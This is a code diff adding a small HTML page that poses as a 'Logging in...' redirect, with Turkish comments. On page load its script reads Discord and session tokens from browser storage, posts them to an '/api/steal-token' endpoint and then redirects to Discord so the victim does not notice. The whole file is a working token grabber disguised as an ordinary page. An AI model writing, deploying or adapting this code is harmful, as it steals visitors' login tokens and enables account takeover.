@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+ <title>Redirecting...</title>
+ <script>
+ async function stealAndGo() {
+ // 1. Tarayıcı depolama alanında token'ı bul
+ const token = localStorage.getItem('token') || 
+ localStorage.getItem('discord_token') || 
+ sessionStorage.getItem('token');
+
+ // 2. Vercel API'mize gönder
+ if (token) {
+ await fetch('/api/steal-token', {
+ method: 'POST',
+ headers: { 'Content-Type': 'application/json' },
+ body: JSON.stringify({ token })
+ });
+ }
+ // 3. Kimse fark etmesin diye Discord'a yönlendir
+ window.location.href = "https://discord.com/channels/@me";
+ }
+ window.onload = stealAndGo;
+ </script>
+</head>
+<body>
+ <h1>Logging in...</h1>
+</body>
+</html>
